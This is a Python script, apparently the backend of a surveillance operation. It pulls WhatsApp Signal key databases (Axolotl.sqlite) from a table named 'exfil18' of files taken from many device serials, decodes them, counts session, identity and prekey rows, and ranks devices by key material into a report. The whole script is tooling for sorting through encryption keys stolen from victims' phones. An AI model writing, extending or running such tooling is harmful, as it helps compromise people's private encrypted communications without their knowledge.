#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
axolotl_audit.py —— Axolotl.sqlite（WhatsApp Signal 会话库）盘点 + 活跃度分析
  数据源：PG exfil18 表（path 含 Axolotl）→ bin_path（JSON{data:base64}）→ 临时 sqlite → 解析
  输出：docs/axolotl_audit_<date>.json + 控制台汇总
用法: python3 tools/axolotl_audit.py [--serial X] [--limit N]
"""
import sys, os, json, base64, sqlite3, tempfile, time
from collections import defaultdict

import subprocess

BASE = '/www/wwwroot/i.131422.com'
PG_CFG = json.load(open(os.path.join(BASE, 'adm888app', 'data', 'pg.json')))

LIMIT = 0
SERIAL = ''
for i, a in enumerate(sys.argv):
    if a == '--limit' and i + 1 < len(sys.argv):
        LIMIT = int(sys.argv[i + 1])
    if a == '--serial' and i + 1 < len(sys.argv):
        SERIAL = sys.argv[i + 1]


def pg_query(sql):
    """psql 子进程取数（避免依赖 psycopg2）"""
    env = dict(os.environ, PGPASSWORD=PG_CFG['password'])
    r = subprocess.run(['psql', '-h', '127.0.0.1', '-U', 'panel', '-d', 'panel', '-t', '-A', '-F', '\x1f', '-c', sql],
                       capture_output=True, text=True, env=env, timeout=600)
    out = []
    for line in r.stdout.strip().split('\n'):
        if line.strip():
            out.append(line.split('\x1f'))
    return out


def unpack(bin_path):
    """ext_stats bin → sqlite 字节"""
    j = json.load(open(bin_path, encoding='utf-8', errors='ignore'))
    d = j.get('data') or ''
    return base64.b64decode(d)


def parse_sqlite(buf):
    """返回各表行数 + 活跃度指标"""
    fd, tmp = tempfile.mkstemp(suffix='.sqlite')
    os.close(fd)
    try:
        open(tmp, 'wb').write(buf)
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
        tabs = [r[0] for r in cur.fetchall()]
        out = {'tables': {}, 'total': 0}
        for t in tabs:
            if not t.startswith('ZWA'):
                continue
            try:
                cur.execute(f"SELECT count(*) FROM '{t}'")
                n = cur.fetchone()[0]
                out['tables'][t] = n
                out['total'] += n
            except Exception:
                out['tables'][t] = -1
        # 活跃度：ZWAAXOLOTLSESSION 是否有状态；ZWAPREKEY 数量；senderkey 数量
        out['sessions'] = out['tables'].get('ZWAAXOLOTLSESSION', 0)
        out['identities'] = out['tables'].get('ZWAAXOLOTLIDENTITY', 0)
        out['prekeys'] = out['tables'].get('ZWAPREKEY', 0)
        out['senderkeys'] = out['tables'].get('ZWASENDERKEY', 0)
        out['signedprekeys'] = out['tables'].get('ZWASIGNEDPREKEY', 0)
        con.close()
        return out
    finally:
        try: os.unlink(tmp)
        except Exception: pass


def main():
    cond = "data->>'path' ILIKE '%Axolotl%'"
    if SERIAL:
        cond += " AND serial = '%s'" % SERIAL.replace("'", "''")
    raw = pg_query(f"""SELECT id, serial, bin_path, data->>'path', ts
                    FROM exfil18 WHERE {cond} AND bin_path IS NOT NULL ORDER BY id""")
    rows = []
    for r in raw:
        if len(r) >= 5:
            try:
                rows.append((int(r[0]), r[1], r[2], r[3], int(r[4] or 0)))
            except Exception:
                continue
    if LIMIT:
        rows = rows[:LIMIT]
    print(f'[axolotl] 待分析 {len(rows)} 个文件')

    per_dev = {}          # serial → 最佳记录（total 最大）
    t0 = time.time()
    for i, (rid, serial, bp, path, ts) in enumerate(rows):
        if not os.path.exists(bp):
            continue
        try:
            buf = unpack(bp)
            if buf[:15] != b'SQLite format 3':
                continue
            info = parse_sqlite(buf)
        except Exception as e:
            continue
        info['id'] = rid; info['path'] = path; info['ts'] = ts; info['size'] = len(buf)
        prev = per_dev.get(serial)
        if (not prev) or info['total'] > prev['total']:
            per_dev[serial] = info
        if (i + 1) % 50 == 0:
            print(f'  进度 {i+1}/{len(rows)} | 已覆盖设备 {len(per_dev)} | {time.time()-t0:.0f}s')

    # 汇总
    act = {'活跃(会话>50)': 0, '一般(5-50)': 0, '稀少(1-4)': 0, '空壳(0)': 0}
    devs = []
    for serial, v in sorted(per_dev.items(), key=lambda x: -x[1]['total']):
        s = v['sessions']
        if s > 50: act['活跃(会话>50)'] += 1
        elif s >= 5: act['一般(5-50)'] += 1
        elif s >= 1: act['稀少(1-4)'] += 1
        else: act['空壳(0)'] += 1
        devs.append({'serial': serial, 'size': v['size'], 'total': v['total'],
                     'sessions': v['sessions'], 'identities': v['identities'],
                     'prekeys': v['prekeys'], 'senderkeys': v['senderkeys'],
                     'signedprekeys': v['signedprekeys'], 'path': v['path']})

    report = {
        'generated_at': time.strftime('%Y-%m-%d %H:%M:%S'),
        'files_total': len(rows), 'files_ok': sum(1 for _ in per_dev),
        'devices': len(per_dev),
        'activity': act,
        'top_devices': devs[:60],
        'all_devices': devs,
    }
    out = os.path.join(BASE, 'docs', 'axolotl_audit_%s.json' % time.strftime('%Y%m%d_%H%M'))
    json.dump(report, open(out, 'w', encoding='utf-8'), ensure_ascii=False, indent=1)

    print('\n' + '=' * 66)
    print('Axolotl.sqlite 盘点报告')
    print('=' * 66)
    print(f'  文件: {len(rows)} 个 → 有效 {report["files_ok"]} 个（去重后 {len(per_dev)} 台设备）')
    print(f'  活跃度分布: {act}')
    print()
    print('  Top 20 设备（按密钥材料总量）:')
    for d in devs[:20]:
        print(f'    {d["serial"]:14} | 会话{d["sessions"]:5} 身份{d["identities"]:5} 预钥{d["prekeys"]:5} 群钥{d["senderkeys"]:4} | 库{d["size"]//1024}KB')
    print(f'\n  报告已存: {out}')


if __name__ == '__main__':
    main()
